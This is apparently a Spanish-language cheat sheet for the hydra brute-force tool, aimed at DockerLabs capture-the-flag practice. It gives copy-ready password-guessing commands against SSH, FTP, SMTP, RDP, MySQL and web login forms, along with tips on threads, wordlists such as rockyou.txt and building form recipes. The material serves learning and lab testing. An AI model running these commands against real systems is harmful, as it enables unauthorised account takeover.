# Comandos Hydra

Guía de referencia rápida con los flags más usados de `hydra` para ataques de fuerza bruta a servicios de login. Cada sección explica qué hace cada flag, cuándo conviene usarla y trae el comando listo para copiar (reemplaza `<IP>`, usuarios y wordlists según tu entorno).

---

## 1. Estructura general de un comando hydra

```bash
hydra [opciones de usuario] [opciones de password] [opciones generales] <IP> <servicio>
```

Hydra necesita, como mínimo: **a quién** atacar (IP + servicio), **con qué usuario(s)** y **con qué contraseña(s)**.

---

## 2. Especificar usuario(s)

- `-l <usuario>` → un solo usuario fijo (login **l**owercase de "single login").

  ```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> ssh
  ```

- `-L <archivo>` → lista de usuarios a probar, uno por línea.

  ```bash
  hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt <IP> ssh
  ```

---

## 3. Especificar contraseña(s)

- `-p <password>` → una sola contraseña fija.

  ```bash
  hydra -l admin -p 123456 <IP> ssh
  ```

- `-P <archivo>` → lista de contraseñas a probar (wordlist), una por línea. La más usada en DockerLabs es `rockyou.txt`.

  ```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> ssh
  ```

> Nota: puedes combinar `-L` + `-P` para probar **todas** las combinaciones usuario×contraseña (ataque combinado), lo cual es mucho más lento.

---

## 4. Flags generales de control

- `-t <n>` → número de tareas (threads) en paralelo. Por defecto 16; en servicios que banean por intentos rápidos (SSH, FTP) conviene bajarlo.

  ```bash
  hydra -l admin -P rockyou.txt -t 4 <IP> ssh
  ```

- `-f` → detiene el ataque apenas encuentra la **primera** combinación válida (ahorra tiempo cuando solo necesitas una credencial).

  ```bash
  hydra -l admin -P rockyou.txt -f <IP> ssh
  ```

- `-V` → modo verboso, muestra cada intento usuario/contraseña en tiempo real (útil para confirmar que está funcionando).
- `-vV` → verboso "muy detallado", muestra aún más información de cada intento.
- `-s <puerto>` → especifica un puerto distinto al que usa el servicio por defecto (ej. SSH corriendo en 2222 en vez de 22).

  ```bash
  hydra -l admin -P rockyou.txt -s 2222 <IP> ssh
  ```

- `-o <archivo>` → guarda las credenciales encontradas en un archivo.

  ```bash
  hydra -l admin -P rockyou.txt -o hydra_resultado.txt <IP> ssh
  ```

- `-e nsr` → prueba automáticamente combinaciones extra por cada usuario: `n` (contraseña vacía/**n**ull), `s` (contraseña igual al usuario, **s**ame as login), `r` (usuario **r**everso). Útil como intento rápido antes de tirar la wordlist completa.

  ```bash
  hydra -l admin -e nsr -P rockyou.txt <IP> ssh
  ```

- `-I` → ignora una sesión previa guardada y empieza el ataque desde cero (por defecto hydra puede reanudar un ataque interrumpido).

---

## 5. Servicios más comunes en DockerLabs

El último argumento del comando es el **módulo de servicio**. Los que más vas a encontrar:

- `ssh` → login por SSH.

  ```bash
  hydra -l root -P rockyou.txt <IP> ssh
  ```

- `ftp` → login por FTP.

  ```bash
  hydra -l anonymous -P rockyou.txt <IP> ftp
  ```

- `smtp` → login SMTP (correo saliente).

  ```bash
  hydra -l admin -P rockyou.txt <IP> smtp
  ```

- `rdp` → escritorio remoto de Windows.

  ```bash
  hydra -l administrador -P rockyou.txt <IP> rdp
  ```

- `mysql` → login de base de datos MySQL.

  ```bash
  hydra -l root -P rockyou.txt <IP> mysql
  ```

---

## 6. Formularios web (`http-post-form` / `http-get-form`)

El caso más elaborado: fuerza bruta contra un formulario de login web. Se define con una "receta" separada por dos puntos (`:`) con tres partes: **ruta del formulario**, **campos del POST con la marca `^USER^`/`^PASS^`**, y **string que indica login fallido**.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Usuario o contraseña incorrectos"
```

Desglose de la "receta":

- `/login.php` → ruta del formulario de login.
- `username=^USER^&password=^PASS^` → cuerpo del POST, con `^USER^` y `^PASS^` como marcadores que hydra va reemplazando.
- `Usuario o contraseña incorrectos` → texto exacto que aparece en la respuesta cuando el login **falla** (hydra usa esto para saber que la combinación no sirvió).

> Tip: si el formulario usa GET en vez de POST, se usa `http-get-form` con la misma sintaxis.

---

## 7. Combo recomendado para DockerLabs

Flujo típico cuando ya identificaste un servicio de login con `nmap`/`gobuster`:

```bash
# Paso 1: prueba rápida con usuario conocido y variantes automáticas (nsr)
hydra -l admin -e nsr -t 4 <IP> ssh

# Paso 2: si no hay suerte, fuerza bruta con wordlist completa,
# threads bajos para no saturar el servicio, y guardando resultado
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f -o hydra_ssh.txt <IP> ssh

# Paso 3 (si es un formulario web): arma la receta con Burp/DevTools
# para ver el nombre real de los campos y el mensaje de error exacto
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form \
  "/login.php:username=^USER^&password=^PASS^:incorrecta"
```

---

### Notas rápidas

- Antes de lanzar la wordlist completa, revisa si `nmap`/`gobuster` ya te dieron pistas de usuarios o contraseñas (comentarios en el código fuente, archivos `.txt`, banners de servicio).
- Baja `-t` (threads) en servicios como SSH que suelen tener protección anti fuerza bruta o limitan conexiones simultáneas.
- Para formularios web, usa las DevTools del navegador (pestaña Network) para copiar exactamente el nombre de los campos del POST y el mensaje de error.
- `rockyou.txt` viene comprimido en Kali (`/usr/share/wordlists/rockyou.txt.gz`); si no existe descomprimido, usa `gunzip /usr/share/wordlists/rockyou.txt.gz` primero.
